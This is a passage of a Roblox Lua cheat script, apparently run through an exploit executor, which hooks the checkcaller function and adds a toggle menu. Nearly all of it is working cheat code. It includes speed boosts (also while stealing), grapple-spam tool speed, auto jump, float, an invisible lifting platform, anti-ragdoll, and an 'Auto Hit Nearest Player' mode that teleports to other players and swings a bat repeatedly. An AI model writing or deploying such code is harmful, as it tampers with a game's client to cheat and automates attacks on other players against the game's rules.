		local backpack = localPlayer:FindFirstChildOfClass("Backpack")

		if backpack then
			fn29(backpack)
		end

		connection7 = localPlayer.ChildAdded:Connect(function(child)
			if child:IsA("Backpack") then
				fn29(child)
				fn27()
			end
		end)

		local function fn30(arg, arg2)
			str = arg
			now = arg2
			v14 = nil
		end

		local function fn31(arg, arg2)
			if not arg then
				v14 = nil
				return false
			end
			local v27 = v14
			local v28

			if v14 then
				v28 = v27
			else
				v28 = arg2
			end

			v14 = v28
			return arg2 - v14 >= n6
		end

		local function fn32(arg, arg2)
			local assemblyLinearVelocity = arg.AssemblyLinearVelocity
			arg.AssemblyLinearVelocity = Vector3.new(assemblyLinearVelocity.X, arg2, assemblyLinearVelocity.Z)
		end

		local function fn33(arg, arg2)
			local parent = arg.Parent

			if v24 ~= parent then
				v24 = parent
				raycastParams.FilterDescendantsInstances = { parent }
			end

			local n26

			if arg2.RigType == Enum.HumanoidRigType.R6 then
				n26 = 3
			else
				n26 = math.max(arg.Size.Y * 0.5, arg2.HipHeight + arg.Size.Y * 0.5)
			end

			local hit = Workspace:Raycast(arg.Position, Vector3.new(0, -(n26 + n7), 0), raycastParams)
			return hit ~= nil and hit.Normal.Y > 0.15
		end

		local connection9 = RunService.Heartbeat:Connect(function(deltaTime)
			local v27, v28 = fn9()
			local now3 = os.clock()

			if not v27 or not v28 or v28.Health <= 0 then
				v15 = nil
				y = nil
				n22 = 0
				return
			end

			if v27 ~= v15 or not y then
				v15 = v27
				y = v27.Position.Y
				now2 = now3
				n22 = 0
				fn30("Bottom", now3)
			else
				local n26 = now3 - now2

				if n26 > 0 then
					n22 = (v27.Position.Y - y) / n26
				end

				y = v27.Position.Y
				now2 = now3
			end

			if flag2 then
				local n26 = math.max(0.02, n3 / n15)
				local n27 = math.max(0.01, n5 / n15)
				local n28 = n4 * n15
				local n29 = now3 - now

				if str == "Rise" then
					local n30 = math.clamp(n29 / n26, 0, 1)
					local n31 = n12 * 3.1415926535897931 / 2 * n26 * math.cos(n30 * 3.1415926535897931 * 0.5)

					if fn31(n29 >= 0.06 and n31 >= n10 and math.abs(n22) <= n11, now3) then
						fn30("Fall", now3)
					elseif n30 >= 1 then
						fn30("Hold", now3)
						fn32(v27, 0)
					else
						fn32(v27, n31)
					end
				elseif str == "Hold" then
					if n13 <= n29 then
						fn30("Fall", now3)
					else
						fn32(v27, 0)
					end
				elseif str == "Fall" then
					local n30 = math.clamp(n29 / n27, 0, 1)
					local n31 = -n28 * math.sin(n30 * 3.1415926535897931 * 0.5)

					if fn31(n29 >= 0.01 and n31 <= -n10 and n22 >= -n11, now3) or n30 >= 1 then
						fn30("Bottom", now3)
					else
						fn32(v27, n31)
					end
				else
					v14 = nil

					if n29 >= n14 and fn33(v27, v28) then
						fn30("Rise", now3)
					end
				end
			else
				v14 = nil

				if str ~= "Bottom" then
					fn30("Bottom", now3)
				end
			end

			if flag5 then
				local character_ = localPlayer.Character
				local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")

				if not (humanoid and humanoid.Health > 0) then
					flag8 = false
					n23 = math.max(n23, now3 + 1.5)
				else
					local tool = character_:FindFirstChildWhichIsA("Tool")
					flag8 = tool ~= nil and tool.Name == v26

					if not tool or tool.Name ~= v26 then
						if not fn7() and now3 >= n23 then
							fn22()
						end
					elseif v26 == str2 then
						v16 = tool
						flag10 = true
						fn13(tool)
						fn18(tool)
						fn16(tool)
					end
				end
			else
				flag8 = false
			end

			local flag16 = localPlayer:GetAttribute("Stealing") == true
			local flag17 = flag16 and not flag7
			flag7 = flag16

			if flag17 and flag3 and v18 and (not flag4 or v18:Get() ~= true) and not flag6 then
				flag6 = true

				task.defer(function()
					flag6 = false
					if not flag or localPlayer:GetAttribute("Stealing") ~= true or not flag3 or not v18 then
						return
					end

					if v18:Get() ~= true then
						v18:Set(true, true)
					else
						flag4 = true
						n20 = math.max(20, n17 - n8)
						n21 = 1
					end
				end)
			end

			local v29 = flag16 and flag4
			local flag18 = flag5 and flag8 and not flag16

			if flag18 then
				local assemblyLinearVelocity = v27.AssemblyLinearVelocity
				local moveDirection = v28.MoveDirection
				local vector = Vector3.zero

				if moveDirection.Magnitude > 0.001 then
					vector = moveDirection.Unit * flag15
				end

				v27.AssemblyLinearVelocity = Vector3.new(vector.X, assemblyLinearVelocity.Y, vector.Z)
				flag9 = true
			else
				fn19()
			end

			local v30

			if v29 then
				local n26 = math.max(20, n17 - n8)

				if n17 <= n26 then
					n20 = n17
				else
					n20 += n21 * n9 * deltaTime

					if n17 <= n20 then
						n20 = n17
						n21 = -1
					elseif n20 <= n26 then
						n20 = n26
						n21 = 1
					end
				end

				v30 = n20
			else
				local flag19 = not flag16 and flag3 and not flag18
				v30 = nil

				if flag19 then
					v30 = n16
				end
			end

			if v30 then
				local moveDirection = v28.MoveDirection
				local n26 = v30 - v28.WalkSpeed

				if moveDirection.Magnitude > 0.001 and math.abs(n26) > 0.001 then
					v27.CFrame = v27.CFrame + moveDirection * n26 * deltaTime
				end
			end
		end)

		local connection10 = localPlayer.CharacterAdded:Connect(function(character_)
			v15 = nil
			y = nil
			fn17()
			fn12()
			v16 = nil
			flag8 = false
			n23 = os.clock() + 3
			fn28(character_)
			local backpack2 = localPlayer:FindFirstChildOfClass("Backpack")

			if backpack2 then
				fn29(backpack2)
			end

			fn27()

			if flag5 then
				task.spawn(function()
					local humanoid = character_:WaitForChild("Humanoid", 3)
					if not humanoid then
						return
					end

					if not character_:WaitForChild("HumanoidRootPart", 3) then
						return
					end
					local now3 = os.clock()
					local grappleHook

					while true do
						grappleHook = fn4(v26)

						if fn8(grappleHook) then
							break
						else
							task.wait(0.1)
							if not (fn8(grappleHook) or os.clock() - now3 >= 3 or not flag5) then
								continue
							end
							break
						end
					end

					if not flag5 then
						return
					end

					if not fn8(grappleHook) and v26 == str2 then
						grappleHook = fn5("Grapple Hook")
					end

					if fn8(grappleHook) and flag5 and humanoid.Health > 0 then
						task.wait(0.15)
						v16 = fn24(grappleHook)

						if v16 then
							flag8 = true

							if v26 == str2 then
								fn14()
								flag10 = true
								fn13(v16)
								fn18(v16)
								RunService.Heartbeat:Wait()
								fn16(v16)
							end
						else
							fn21()
						end
					elseif flag5 then
						fn21()
					end
				end)
			end
		end)

		fn2(function()
			flag2 = false
			flag3 = false
			flag4 = false
			flag11 = false
			fn20()
			flag14 = false

			if v22 then
				pcall(function()
					hookfunction(checkcaller, v22)
				end)
			end

			if connection10 then
				connection10:Disconnect()
				connection10 = nil
			end

			if connection then
				connection:Disconnect()
				connection = nil
			end

			if connection2 then
				connection2:Disconnect()
				connection2 = nil
			end

			if connection3 then
				connection3:Disconnect()
				connection3 = nil
			end

			if connection4 then
				connection4:Disconnect()
				connection4 = nil
			end

			if connection5 then
				connection5:Disconnect()
				connection5 = nil
			end

			if connection9 then
				connection9:Disconnect()
				connection9 = nil
			end
		end)

		v12:CreateSlider({
			Name = "Adjust Speed",
			ShowWhen = v12:CreateToggle({
				Name = "Speed Boost",
				Default = true,
				Note = "Moves faster without a tool and pauses while stealing.",
				Callback = function(arg)
					flag3 = arg == true
				end,
			}),
			Min = 20,
			Max = 64,
			Default = 52,
			AllowDecimals = true,
			Increment = 0.1,
			Callback = function(arg)
				n16 = math.clamp(tonumber(arg) or 52, 20, 64)
			end,
		})

		v18 = v12:CreateToggle({
			Name = "Speed Boost While Stealing",
			Default = true,
			Note = "Smoothly varies speed while stealing.",
			Callback = function(arg)
				flag4 = arg == true
				n20 = math.max(20, n17 - n8)
				n21 = 1
			end,
		})

		v12:CreateSlider({
			Name = "Adjust Auto Speed",
			DisplayName = "Adjust Speed On Steal",
			ShowWhen = v18,
			Min = 20,
			Max = 29,
			Default = 28,
			AllowDecimals = true,
			Increment = 0.1,
			Callback = function(arg)
				n17 = math.clamp(tonumber(arg) or 28, 20, 29)
				n20 = math.max(20, n17 - n8)
				n21 = 1
			end,
		})

		v17 = v12:CreateToggle({
			Name = "Tool Speed Boost",
			Default = false,
			Keybind = Enum.KeyCode.Q,
			Note = "Equips the selected speed tool. Switching tools turns this off.",
			Callback = function(arg)
				if arg then
					if not fn25() then
						task.defer(function()
							if v17 then
								v17:Set(false, true)
							end
						end)
					end
				else
					fn20()
				end
			end,
		})

		v19 = v12:CreateDropdown({
			Name = "Speed Tool",
			ShowWhen = v17,
			Options = v25,
			Default = "Grapple Hook",
			Callback = function(arg)
				local str3 = tostring(arg or "Grapple Hook")
				if str3 == v26 then
					return
				end
				v26 = str3
				fn11()

				if flag5 then
					fn21()
				end
			end,
		})

		v20 = v12:CreateSlider({
			Name = "Adjust Tool Speed",
			ShowWhen = v17,
			Min = 50,
			Max = v26 == str2 and 270 or 210,
			Default = 240,
			AllowDecimals = true,
			Increment = 0.1,
			Callback = function(arg)
				if v26 == str2 then
					n18 = math.clamp(tonumber(arg) or 240, 50, 270)
					flag15 = n18
				else
					n19 = math.clamp(tonumber(arg) or 185, 50, 210)
					flag15 = n19
				end
			end,
		})

		local v27 = v13:CreateToggle({
			Name = "Auto Jump",
			Default = false,
			Note = "Automatically repeats jumps.",
			Callback = function(arg)
				flag2 = arg == true
				fn30("Bottom", os.clock())
			end,
		})

		v13:CreateSlider({
			Name = "Height",
			SubOf = v27,
			Min = 1,
			Max = 21,
			Default = 16,
			AllowDecimals = true,
			Increment = 0.1,
			Note = "Sets the maximum height of each jump.",
			Callback = function(arg)
				n12 = math.clamp(tonumber(arg) or 19.1, 1, 21)
			end,
		})

		v13:CreateSlider({
			Name = "Auto Jump Speed",
			SubOf = v27,
			DisplayName = "Jump Speed",
			Min = 20,
			Max = 110,
			Default = 50,
			AllowDecimals = true,
			Increment = 0.1,
			Note = "Controls jump speed (20 to 110, default 52 = 0.52x).",
			Callback = function(arg)
				n15 = math.clamp(tonumber(arg) or 52, 20, 110) / 100
			end,
		})

		v13:CreateSlider({
			Name = "Air Hold",
			SubOf = v27,
			Min = 0,
			Max = 1,
			Default = 0.1,
			AllowDecimals = true,
			Increment = 0.01,
			Note = "Controls how long you stay at the top of each jump.",
			Callback = function(arg)
				n13 = math.clamp(tonumber(arg) or 0.2, 0, 1)
			end,
		})

		v13:CreateSlider({
			Name = "Ground Delay",
			SubOf = v27,
			Min = 0,
			Max = 1,
			Default = 0,
			AllowDecimals = true,
			Increment = 0.01,
			Note = "Controls how long to wait on the ground before jumping again.",
			Callback = function(arg)
				n14 = math.clamp(tonumber(arg) or 0, 0, 1)
			end,
		})

		floatSpeedToolBridge.GetSelectedName = function()
			return v26
		end

		floatSpeedToolBridge.EquipSelected = function()
			local grappleHook = fn4(v26)

			if not fn8(grappleHook) and v26 == str2 then
				local v28
				grappleHook, v28 = fn5("Grapple Hook")
				if not fn8(grappleHook) then
					fn23("Grapple Hook", v28)
					return nil
				end
			elseif not fn8(grappleHook) then
				v.Notify("Tool unavailable", v26 .. " is not currently owned.", 5)
				return nil
			end

			local v28 = fn24(grappleHook)
			if not v28 then
				v.Notify("Tool unavailable", "Unable to equip " .. v26 .. " right now.", 5)
				return nil
			end
			return v28
		end

		floatSpeedToolBridge.StartGrappleSpam = function(arg)
			if not fn8(arg) or arg.Name ~= str2 then
				return false
			end
			flag11 = true
			fn14()
			fn13(arg)
			fn18(arg)
			fn16(arg)
			return true
		end

		floatSpeedToolBridge.PulseGrapple = function(arg)
			if not flag11 or not fn8(arg) or arg.Name ~= str2 then
				return false
			end
			fn13(arg)
			fn18(arg)
			fn16(arg)
			return true
		end

		floatSpeedToolBridge.StopGrappleSpam = function()
			flag11 = false

			if not flag10 then
				n24 = 0
				fn17()
				fn12()
			end
		end
	end

	do
		local n25 = 0.0083333333333333332
		local n26 = 4
		local n27 = 0.12
		local n28 = 25
		local n29 = 0.045
		local n30 = 0.03
		local n31 = 10
		local n32 = 60
		local flag12 = false
		local connection6 = nil
		local n33 = 0
		local flag13 = false
		local n34 = 0
		local n35 = 0
		local n36 = 0
		local v21 = nil
		local flag14 = false
		local flag15 = false
		local v22 = nil
		local flag16 = false

		local function fn9()
			if connection6 then
				connection6:Disconnect()
				connection6 = nil
			end

			flag12 = false
			n33 = 0
			flag13 = false
			n34 = 0
			n35 = 0
			n36 = 0
			v21 = nil
			local stopGrappleSpam = floatSpeedToolBridge.StopGrappleSpam

			if type(stopGrappleSpam) == "function" then
				stopGrappleSpam()
			end
		end

		local function fn10()
			if flag16 then
				return
			end
			flag16 = true

			task.defer(function()
				flag16 = false
				fn9()

				if v22 and v22:Get() == true then
					v22:Set(false, true)
				end
			end)
		end

		local function fn11(arg)
			if not flag12 or not arg or not arg.Parent then
				return
			end
			local now3 = os.clock()
			n35 = n32
			n34 = now3 + n27
			flag13 = true
			n36 = now3
		end

		local function fn12(arg, arg2)
			local assemblyLinearVelocity = arg.AssemblyLinearVelocity
			local flag17 = arg2.FloorMaterial ~= Enum.Material.Air
			local now3 = os.clock()

			if now3 - n36 >= n29 or flag13 and n34 - now3 <= n30 then
				fn11(arg)
			end

			if flag13 then
				if n34 <= now3 then
					flag13 = false
				else
					local n37 = (Workspace.Gravity - Workspace.Gravity) * n25
					arg.AssemblyLinearVelocity = Vector3.new(assemblyLinearVelocity.X, assemblyLinearVelocity.Y + (n35 - assemblyLinearVelocity.Y) * (1 - math.exp(-n28 * n25)) - n37, assemblyLinearVelocity.Z)
				end
			elseif not flag17 then
				local gravity = Workspace.Gravity

				if assemblyLinearVelocity.Y < 0 then
					gravity += n31
				end

				local n37 = gravity - Workspace.Gravity

				if math.abs(n37) > 0.001 then
					arg.AssemblyLinearVelocity = Vector3.new(assemblyLinearVelocity.X, assemblyLinearVelocity.Y - n37 * n25, assemblyLinearVelocity.Z)
				end
			end
		end

		local function fn13(arg)
			fn9()
			v21 = arg
			local startGrappleSpam = floatSpeedToolBridge.StartGrappleSpam

			if v21 and type(startGrappleSpam) == "function" then
				if not startGrappleSpam(v21) then
					v21 = nil
				end
			end

			flag12 = true
			local character_ = localPlayer.Character
			character_ = character_ and character_:FindFirstChild("HumanoidRootPart")

			if character_ then
				fn11(character_)
			end

			connection6 = RunService.Heartbeat:Connect(function(deltaTime)
				if not flag12 then
					return
				end

				if flag15 and localPlayer:GetAttribute("Stealing") == true then
					fn10()
					return
				end
				local character_2 = localPlayer.Character
				local humanoidRootPart = character_2 and character_2:FindFirstChild("HumanoidRootPart")
				if not humanoidRootPart then
					return
				end
				local humanoid = character_2:FindFirstChildOfClass("Humanoid")
				if humanoid and humanoid.Health <= 0 then
					fn10()
					return
				end
				local pulseGrapple = floatSpeedToolBridge.PulseGrapple

				if v21 and type(pulseGrapple) == "function" then
					if not pulseGrapple(v21) then
						v21 = nil
					end
				end

				n33 += deltaTime
				if n33 < n25 then
					return
				end
				local n37 = math.floor(n33 / n25)

				if n26 < n37 then
					n33 = 0
					n37 = 4
				else
					n33 -= n37 * n25
				end

				for i_ = 1, n37 do
					fn12(humanoidRootPart, humanoid)
				end
			end)
		end

		v22 = v5:CreateToggle({
			Name = "Float",
			Default = false,
			Callback = function(arg)
				if arg then
					if flag15 and localPlayer:GetAttribute("Stealing") == true then
						fn10()
						return
					end
					local v23 = nil

					if flag14 then
						local equipSelected = floatSpeedToolBridge.EquipSelected

						if type(equipSelected) ~= "function" then
							v.Notify("Tool unavailable", "The Speed Tool selection is not available right now.", 5)
							fn10()
							return
						end

						v23 = equipSelected()
						if not v23 then
							fn10()
							return
						end
					end

					fn13(v23)
				else
					fn9()
				end
			end,
		})

		v5:CreateToggle({
			Name = "Auto Equip Speed Tool",
			Note = "Equips the current Speed Tool selection before Float starts.",
			Default = true,
			SubOf = v22,
			Callback = function(arg)
				flag14 = arg == true
			end,
		})

		v5:CreateToggle({
			Name = "Auto Off After Steal",
			Default = true,
			SubOf = v22,
			Callback = function(arg)
				flag15 = arg == true

				if flag15 and flag12 and localPlayer:GetAttribute("Stealing") == true then
					fn10()
				end
			end,
		})

		fn2(function()
			fn9()
		end)
	end

	do
		local n25 = 1
		local flag12 = false
		local connection6 = nil
		local v21 = nil
		local n26 = 5

		local function fn9()
			if v21 then
				pcall(function()
					v21:Destroy()
				end)

				v21 = nil
			end
		end

		local function fn10()
			if connection6 then
				connection6:Disconnect()
				connection6 = nil
			end

			flag12 = false
			fn9()
		end

		local function createPart()
			if v21 and v21.Parent then
				return v21
			end
			fn9()
			local part = Instance.new("Part")
			part.Name = fn()
			part.Anchored = true
			part.CanCollide = true
			part.CanQuery = false
			part.CanTouch = false
			part.CastShadow = false
			part.Massless = true
			part.Size = Vector3.new(6, 1, 6)
			part.Transparency = 1
			part.Parent = Workspace
			v21 = part
			return part
		end

		local function fn11()
			fn10()
			flag12 = true

			connection6 = RunService.Heartbeat:Connect(function(deltaTime)
				if not flag12 then
					return
				end
				local character_ = localPlayer.Character
				local humanoidRootPart = character_ and character_:FindFirstChild("HumanoidRootPart")
				if not humanoidRootPart then
					fn9()
					return
				end
				local v22 = createPart()
				local n27 = math.min(deltaTime, 0.1) * n26
				local humanoid = character_:FindFirstChildOfClass("Humanoid")
				local n28 = 3.2

				if humanoid then
					n28 = humanoid.HipHeight + humanoidRootPart.Size.Y * 0.5
				end

				local n29 = humanoidRootPart.Position.Y - n28
				local y2 = v22.Position.Y
				local n30

				if math.abs(y2 + n25 * 0.5 - n29) > 6 then
					n30 = n29 - n25 * 0.5
				else
					n30 = y2 + n27
				end

				v22.CFrame = CFrame.new(humanoidRootPart.Position.X, n30, humanoidRootPart.Position.Z)
				local n31 = n30 + n25 * 0.5

				if n31 > n29 then
					local n32 = n31 + n28
					local n33 = humanoidRootPart.CFrame - humanoidRootPart.CFrame.Position
					humanoidRootPart.CFrame = CFrame.new(humanoidRootPart.Position.X, n32, humanoidRootPart.Position.Z) * n33
					local assemblyLinearVelocity = humanoidRootPart.AssemblyLinearVelocity
					humanoidRootPart.AssemblyLinearVelocity = Vector3.new(assemblyLinearVelocity.X, 0, assemblyLinearVelocity.Z)
				end
			end)
		end

		v5:CreateSlider({
			Name = "Floor Push Speed",
			Min = 5,
			Max = 40,
			Default = 10,
			AllowDecimals = false,
			Increment = 1,
			Unit = " studs/s",
			Quick = false,
			SubOf = v5:CreateToggle({
				Name = "Floor Push",
				Note = "Raises an invisible platform under you and carries you up with it.",
				Default = false,
				Callback = function(arg)
					if arg then
						fn11()
					else
						fn10()
					end
				end,
			}),
			Callback = function(arg)
				n26 = math.clamp(tonumber(arg) or 5, 5, 40)
			end,
		})
	end
end

local v9, v10, v11, fn4, fn5, fn6, fn7, fn8, fn9, tbl3
local fn10, fn11, fn12, n, fn13, fn14, fn15

do
	do
		local n2 = 0.01
		local flag2 = false
		local n3 = 50
		local connection = nil
		local connection2 = nil
		local v12 = nil
		local v13 = nil
		local autoRotate = true
		local v14 = nil
		local v15 = nil
		local flag3 = false
		local flag4 = false
		local n4 = 0
		local obj2 = setmetatable({}, { __mode = "k" })

		local function fn16(arg)
			arg = arg and arg.Character
			local humanoid = arg and arg:FindFirstChildOfClass("Humanoid")
			local humanoidRootPart

			if arg then
				humanoidRootPart = arg:FindFirstChild("HumanoidRootPart") or arg:FindFirstChild("UpperTorso") or arg:FindFirstChild("Torso")
			else
				humanoidRootPart = arg
			end

			if humanoid and humanoid.Health > 0 and humanoidRootPart then
				return arg, humanoid, humanoidRootPart
			end
		end

		local function fn17(arg)
			local huge = math.huge
			local v16 = nil

			for _, player in ipairs(Players:GetPlayers()) do
				if player ~= localPlayer then
					local v17, v18, v19 = fn16(player)

					if v19 then
						local magnitude = (v19.Position - arg.Position).Magnitude

						if magnitude < huge then
							huge = magnitude
							v16 = v19
						end
					end
				end
			end

			return v16
		end

		local function fn18(arg)
			arg = arg and arg:FindFirstChildWhichIsA("Tool")
			if arg and arg.Name:lower():find("bat", 1, true) then
				return arg
			end
			local backpack = localPlayer:FindFirstChildOfClass("Backpack")

			if backpack then
				for _, child in ipairs(backpack:GetChildren()) do
					if child:IsA("Tool") and child.Name:lower():find("bat", 1, true) then
						return child
					end
				end
			end
		end

		local function fn19(arg, arg2)
			local v16 = fn18(arg)

			if not v16 then
				if not flag4 then
					flag4 = true
					v.Notify("Bat unavailable", "Bat was not found in your character or Backpack.", 5)
				end

				return nil
			end

			flag4 = false

			if v16.Parent ~= arg then
				local tool = arg:FindFirstChildWhichIsA("Tool")

				if tool and tool ~= v16 and not v14 then
					v14 = tool
				end

				v15 = v16
				flag3 = true

				pcall(function()
					fn3(1)
					arg2:EquipTool(v16)
				end)
			end

			return v16.Parent == arg and v16 or nil
		end

		local function fn20(arg)
			if not arg:IsA("BasePart") then
				return
			end

			if obj2[arg] == nil then
				obj2[arg] = arg.CanCollide
			end

			arg.CanCollide = false
		end

		local function fn21()
			for k, v16 in pairs(obj2) do
				if k.Parent then
					pcall(function()
						k.CanCollide = v16
					end)
				end

				obj2[k] = nil
			end
		end

		local function fn22(arg)
			if v12 == arg then
				return
			end

			if connection2 then
				connection2:Disconnect()
				connection2 = nil
			end

			fn21()
			v12 = arg
			if not arg then
				return
			end

			for _, descendant in ipairs(arg:GetDescendants()) do
				fn20(descendant)
			end

			connection2 = arg.DescendantAdded:Connect(function(descendant)
				if flag2 then
					fn20(descendant)
				end
			end)
		end

		local function fn23()
			local v16 = v13
			v13 = nil
			if not v16 or not v16.Parent then
				return
			end

			pcall(function()
				v16.AutoRotate = autoRotate
				local physics = Enum.HumanoidStateType.Physics

				if v16:GetState() == physics then
					v16:ChangeState(Enum.HumanoidStateType.Freefall)
				end
			end)
		end

		local function fn24(arg)
			if v13 ~= arg then
				fn23()
				v13 = arg
				autoRotate = arg.AutoRotate
			end

			arg.AutoRotate = false
			local physics = Enum.HumanoidStateType.Physics

			if arg:GetState() ~= physics then
				arg:ChangeState(Enum.HumanoidStateType.Physics)
			end
		end

		local function fn25()
			local character_ = localPlayer.Character
			local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")
			local v16 = v15
			local v17 = v14
			v15 = nil
			v14 = nil
			if not flag3 or not character_ or not humanoid or humanoid.Health <= 0 then
				flag3 = false
				return
			end
			flag3 = false
			local tool = character_:FindFirstChildWhichIsA("Tool")
			if tool and tool ~= v16 then
				return
			end

			pcall(function()
				fn3(0.5)

				if v17 and v17.Parent then
					humanoid:EquipTool(v17)
				else
					humanoid:UnequipTools()
				end
			end)
		end

		local function fn26()
			flag2 = false
			n4 = 0
			flag4 = false

			if connection then
				connection:Disconnect()
				connection = nil
			end

			if connection2 then
				connection2:Disconnect()
				connection2 = nil
			end

			v12 = nil
			fn23()
			fn21()
			fn25()
		end

		local function fn27()
			fn26()
			flag2 = true

			connection = RunService.Heartbeat:Connect(function(deltaTime)
				local v16, v17, v18 = fn16(localPlayer)

				if not v16 or not v17 or not v18 then
					n4 = 0
					fn23()
					return
				end

				fn22(v16)
				local v19 = fn19(v16, v17)
				local v20 = fn17(v18)

				if not v20 then
					n4 = 0
					fn23()
					return
				end

				fn24(v17)
				local lookVector = v20.CFrame.LookVector
				local vector = Vector3.new(lookVector.X, 0, lookVector.Z)
				local vector2

				if vector.Magnitude <= 0.001 then
					vector2 = Vector3.new(0, 0, -1)
				else
					vector2 = vector.Unit
				end

				local position = v20.Position
				local n5 = position - v18.Position
				local magnitude = n5.Magnitude

				if magnitude > 0.001 then
					position = v18.Position + n5.Unit * math.min(magnitude, n3 * deltaTime)
				end

				v18.CFrame = CFrame.lookAt(position, position + vector2, Vector3.new(0, 1, 0))
				v18.AssemblyLinearVelocity = v20.AssemblyLinearVelocity
				v18.AssemblyAngularVelocity = Vector3.zero
				if not v19 then
					n4 = 0
					return
				end
				n4 += deltaTime
				local n6 = math.min(math.floor(n4 / n2), 6)
				if n6 <= 0 then
					return
				end
				n4 -= n6 * n2

				for i_ = 1, n6 do
					pcall(function()
						v19:Deactivate()
						v19:Activate()
					end)
				end
			end)
		end

		fn2(fn26)

		v5:CreateSlider({
			Name = "Follow Speed",
			DisplayName = "Follow Speed",
			SubOf = v5:CreateToggle({
				Name = "Auto Hit Nearest Player",
				Default = false,
				Callback = function(arg)
					if arg then
						fn27()
					else
						fn26()
					end
				end,
			}),
			Min = 20,
			Max = 64,
			Default = 50,
			AllowDecimals = true,
			Increment = 0.1,
			Callback = function(arg)
				n3 = math.clamp(tonumber(arg) or 50, 20, 64)
			end,
		})
	end

	do
		local tbl4 = { BallSocketConstraint = true, NoCollisionConstraint = true, HingeConstraint = true }

		local tbl5 = {
			[Enum.HumanoidStateType.Physics] = true,
			[Enum.HumanoidStateType.Ragdoll] = true,
			[Enum.HumanoidStateType.FallingDown] = true,
		}

		local n2 = 12
		local n3 = 5
		local n4 = 0
		local v12 = nil

		local ok, result = pcall(function()
			return require(ReplicatedStorage.Controllers.RagdollController)
		end)

		if ok then
			v12 = result
		end

		local v13 = nil

		local function fn16()
			if v13 then
				return v13
			end

			local ok2, result2 = pcall(function()
				return require(localPlayer:WaitForChild("PlayerScripts", 5):WaitForChild("PlayerModule", 5)):GetControls()
			end)

			if ok2 then
				v13 = result2
			end

			return v13
		end

		local flag2 = false
		local connection = nil
		local n5 = 0
		local tbl6 = {}
		local tbl7 = {}
		local n6 = 0
		local v14 = nil
		local humanoid = nil

		local function fn17(arg)
			for _, v15 in ipairs(arg) do
				if v15.Connected then
					v15:Disconnect()
				end
			end

			table.clear(arg)
		end

		local function fn18(arg)
			tbl6[#tbl6 + 1] = arg
		end

		local function fn19(arg)
			tbl7[#tbl7 + 1] = arg
		end

		local function fn20()
			if not v14 or not humanoid then
				return
			end
			local humanoidRootPart = v14:FindFirstChild("HumanoidRootPart")
			if not humanoidRootPart then
				return
			end
			local assemblyLinearVelocity = humanoidRootPart.AssemblyLinearVelocity
			local vector = Vector3.new(assemblyLinearVelocity.X, 0, assemblyLinearVelocity.Z)
			local n7 = humanoid.WalkSpeed + n3
			local y = assemblyLinearVelocity.Y
			local flag3 = false

			if n7 < vector.Magnitude then
				vector = vector.Unit * n7
				flag3 = true
			end

			if n4 < y then
				y = n4
				flag3 = true
			end

			if flag3 then
				pcall(function()
					humanoidRootPart.AssemblyLinearVelocity = Vector3.new(vector.X, y, vector.Z)
				end)
			end
		end

		local function fn21()
			if not v14 or not v14.Parent then
				return
			end

			for _, descendant in ipairs(v14:GetDescendants()) do
				if tbl4[descendant.ClassName] then
					pcall(function()
						descendant:Destroy()
					end)
				end
			end
		end

		local function fn22()
			if not v14 or not v14.Parent then
				return
			end

			for _, descendant in ipairs(v14:GetDescendants()) do
				if descendant:IsA("AnimationConstraint") and not descendant.Enabled then
					pcall(function()
						descendant.Enabled = true
					end)
				end
			end
		end

		local function fn23()
			local v15 = fn16()

			if v15 and v15.controlsEnabled == false then
				pcall(function()
					v15:Enable()
				end)
			end
		end

		local function fn24()
			local currentCamera = Workspace.CurrentCamera

			if currentCamera and humanoid and currentCamera.CameraSubject ~= humanoid then
				pcall(function()
					currentCamera.CameraSubject = humanoid
				end)
			end
		end

		local function fn25()
			if not humanoid or not humanoid.Parent or humanoid.Health <= 0 then
				return
			end

			if tbl5[humanoid:GetState()] then
				pcall(function()
					humanoid:ChangeState(Enum.HumanoidStateType.Running)
				end)
			end

			if humanoid.PlatformStand then
				humanoid.PlatformStand = false
			end
		end

		local function fn26()
			if not v12 then
				return false
			end

			local ok2, result2 = pcall(function()
				return v12.IsInRagdoll()
			end)

			return ok2 and result2 == true
		end

		local function fn27()
			if connection then
				connection:Disconnect()
				connection = nil
			end
		end

		local function fn28()
			if not flag2 or not v14 or v14 ~= localPlayer.Character or not humanoid or not humanoid:IsDescendantOf(v14) then
				return
			end
			n5 = os.clock() + n2
			if connection then
				return
			end

			connection = RunService.Heartbeat:Connect(function()
				if not flag2 then
					fn27()
					return
				end

				if v14 ~= localPlayer.Character or not humanoid or not humanoid:IsDescendantOf(v14) then
					fn27()
					return
				end
				fn20()
				fn21()
				fn22()
				fn25()
				fn23()
				fn24()

				if os.clock() > n5 or not fn26() then
					fn27()
				end
			end)
		end

		local function fn29(arg)
			n6 += 1
			local v15 = n6
			fn17(tbl7)
			fn27()
			v14 = arg
			humanoid = nil
			if not flag2 or not arg then
				return
			end
			humanoid = arg:FindFirstChildOfClass("Humanoid") or arg:WaitForChild("Humanoid", 5)
			if not flag2 or n6 ~= v15 or arg ~= localPlayer.Character or not humanoid or not humanoid:IsA("Humanoid") then
				return
			end

			if humanoid then
				fn19(humanoid.StateChanged:Connect(function(old, new)
					if flag2 and tbl5[new] then
						fn28()
					end
				end))
			end

			fn19(arg.DescendantAdded:Connect(function(descendant)
				if flag2 and tbl4[descendant.ClassName] then
					fn28()
				end
			end))

			fn24()

			if fn26() then
				fn28()
			end
		end

		local function fn30()
			flag2 = false
			n6 += 1
			fn27()
			fn17(tbl7)
			fn17(tbl6)
			v14 = nil
			humanoid = nil
		end

		local function fn31()
			fn30()
			flag2 = true
			fn16()

			fn18(localPlayer.CharacterAdded:Connect(function(character_)
				if flag2 then
					task.defer(function()
						if flag2 and character_ == localPlayer.Character then
							fn29(character_)
						end
					end)
				end
			end))

			fn18(localPlayer.CharacterRemoving:Connect(function(character_)
				if flag2 and character_ == v14 then
					n6 += 1
					fn27()
					fn17(tbl7)
					v14 = nil
					humanoid = nil
				end
			end))

			fn18(localPlayer:GetAttributeChangedSignal("RagdollEndTime"):Connect(function()
				if flag2 then
					fn28()
				end
			end))

			local packages = ReplicatedStorage:FindFirstChild("Packages")
			local net = packages and packages:FindFirstChild("Net")
			net = net and net:FindFirstChild("RE/CombatService/ApplyImpulse")

			if net then
				fn18(net.OnClientEvent:Connect(function()
					if flag2 then
						fn20()
						fn28()
					end
				end))
			end

			if localPlayer.Character then
				fn29(localPlayer.Character)
			end
		end

		fn2(fn30)

		v6:CreateToggle({
			Name = "Anti Ragdoll",
			Default = true,
			Callback = function(arg)
				if arg then
					fn31()
				else
					fn30()
